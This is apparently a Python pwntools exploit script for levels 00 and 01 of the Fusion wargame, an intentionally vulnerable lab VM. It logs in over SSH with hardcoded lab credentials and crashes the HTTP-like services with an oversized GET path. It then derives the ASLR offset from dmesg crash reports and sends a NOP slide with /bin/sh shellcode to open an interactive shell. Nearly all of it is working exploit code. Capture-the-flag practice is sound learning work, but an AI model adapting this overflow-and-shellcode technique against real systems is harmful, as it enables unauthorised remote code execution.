from pwn import *
from pwnhelper import *
from pwnhelper.dmesg import Dmesg


############################################################################################################################################################
# METHOD DEFINITIONS
############################################################################################################################################################


def connect(level):
    remote_binary = "/opt/fusion/bin/level"+level
    cloned_binary = "/tmp/docgilclonedbinary"+level
    port = "200"+level
    s = ssh("fusion", "192.168.2.129", password="godmode", cache=False)
    s.download_file(remote_binary, cloned_binary)
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"
    return s, port


def build_payload(crash, ret_adr=b""):
    if crash:
        off = 20
    else:
        off = 12

    # build payload
    get = b"GET "
    path = b"/home/fusion/level00/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    # overwrite saved ebp
    path_overflow = b"B" * off
    path_overflow += ret_adr
    # this overwrites ret adr and lets us jump to big buffer on nopslide
    proto = b" HTTP/1.1"

    payload = b""
    payload += get
    payload += path
    payload += path_overflow
    payload += proto
    return payload


##############################################################################
# CRASH LEVEL00 GET unrandomized_sp
##############################################################################

s, port = connect(level="00")
nc = s.process(["nc", "localhost", str(port)])
# "buff is at ..."
r = nc.recvline()
print(r)
old_buf_adr = int(re.findall(r'0x[0-9A-F]+', r.decode("utf-8"), re.I)[0],16)
print("old_buf_adr")
print(hex(old_buf_adr))

payload = build_payload(crash=True)
print("payload:")
print(payload)
nc.sendline(payload)

dmesg = Dmesg(s)
if dmesg.has_segfaulted(s, "level00"):
    unrandomized_sp = dmesg.get_report().sp
else:
    print("progam did not crash")
    exit(1)

print("unrandomized_sp:")
print(hex(unrandomized_sp))




##############################################################################
# CRASH LEVEL01 child GET randomized_sp
##############################################################################

s, port = connect(level="01")
nc = s.process(["nc", "localhost", str(port)])
payload = build_payload(crash=True)

print("payload:")
print(payload)
nc.sendline(payload)

dmesg = Dmesg(s)
if dmesg.has_segfaulted(s, "level01"):
    randomized_sp = dmesg.get_report().sp
else:
    print("progam did not crash")
    exit(1)

print("randomized_sp")
print(hex(randomized_sp))


##############################################################################
# CALC OFFSET AND GET NEW BUF ADR AND EXPLOIT
##############################################################################


aslr_offset = unrandomized_sp - randomized_sp
new_buf_adr = old_buf_adr - aslr_offset

print("aslr_offset")
print(aslr_offset)

print("new_buf_adr")
print(hex(new_buf_adr))

nop_slide = asm(shellcraft.i386.nop()) * 200
sh = asm(shellcraft.i386.linux.sh())

s, port = connect(level="01")
nc = s.process(["nc", "localhost", str(port)])

nop_slide_adr = new_buf_adr+201
print("nop_slide_adr")
print(hex(nop_slide_adr))

payload = build_payload(crash=False, ret_adr=pack(nop_slide_adr))
payload += nop_slide
payload += sh

print("payload:")
print(payload)
nc.sendline(payload)


shell = check_for_shell(nc, always_recvs=True)
if shell:
    nc.interactive()
    exit(0)
else:
    print("no shell")
    exit(1)

